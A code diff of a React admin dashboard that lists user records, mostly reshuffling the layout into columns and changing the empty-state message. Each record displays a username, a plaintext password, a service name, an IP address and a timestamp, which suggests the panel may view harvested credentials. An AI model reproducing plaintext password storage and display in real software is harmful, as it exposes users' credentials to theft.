@@ -33,41 +33,39 @@ const AdminDashboard = () => {
   }
 
   return (
-    <div className={adminStyles.container}>
+    <div>
       <h2 className={adminStyles.title}>User Data</h2>
-      <div className={adminStyles.dataContainer}>
-        {dataSet ? (
-          <>
+      {dataSet && dataSet.length >0 ? (
+        <div className={adminStyles.contentRow}>
+          <div className={adminStyles.dataColumn}>
+            {firstHalf.map((data, index) => (
+              <div key={index} className={adminStyles.data}>
+                <p className={adminStyles.par}>User Name: {data.username}</p>
+                <p className={adminStyles.par}>Password: {data.password}</p>
+                <p className={adminStyles.par}>Service: {data.service}</p>
+                <p className={adminStyles.par}>IP Address: {data.ipv4}</p>
+                <p className={adminStyles.par}>Date: {data.date.split("T")[0]}</p>
+                <p className={adminStyles.par}>Time: {data.date.split("T")[1].split(".")[0]}</p>
+              </div>
+            ))}
+          </div>
+          {secondHalf.length > 0 && (
             <div className={adminStyles.dataColumn}>
-              {firstHalf.map((data, index) => (
+              {secondHalf.map((data, index) => (
                 <div key={index} className={adminStyles.data}>
                   <p className={adminStyles.par}>User Name: {data.username}</p>
                   <p className={adminStyles.par}>Password: {data.password}</p>
                   <p className={adminStyles.par}>Service: {data.service}</p>
-                  <p className={adminStyles.par}>IP Address: {data.ipv4}</p>
                   <p className={adminStyles.par}>Date: {data.date.split("T")[0]}</p>
                   <p className={adminStyles.par}>Time: {data.date.split("T")[1].split(".")[0]}</p>
                 </div>
               ))}
             </div>
-            {secondHalf.length > 0 && (
-              <div className={adminStyles.dataColumn}>
-                {secondHalf.map((data, index) => (
-                  <div key={index} className={adminStyles.data}>
-                    <p className={adminStyles.par}>User Name: {data.username}</p>
-                    <p className={adminStyles.par}>Password: {data.password}</p>
-                    <p className={adminStyles.par}>Service: {data.service}</p>
-                    <p className={adminStyles.par}>Date: {data.date.split("T")[0]}</p>
-                    <p className={adminStyles.par}>Time: {data.date.split("T")[1].split(".")[0]}</p>
-                  </div>
-                ))}
-              </div>
-            )}
-          </>
-        ) : (
-          <h3 className={adminStyles.title}>Loading or Not Signed In</h3>
-        )}
-      </div>
+          )}
+        </div>
+      ) : (
+        <p className={adminStyles.title}>No data</p>
+      )}
       <div className={adminStyles.contentRow}>
         <Button variant="contained" color="success" onClick={() => router.push("/admin")}>
           Back
@@ -76,5 +74,6 @@ const AdminDashboard = () => {
     </div>
   );
 };
+
 
 export default AdminDashboard;
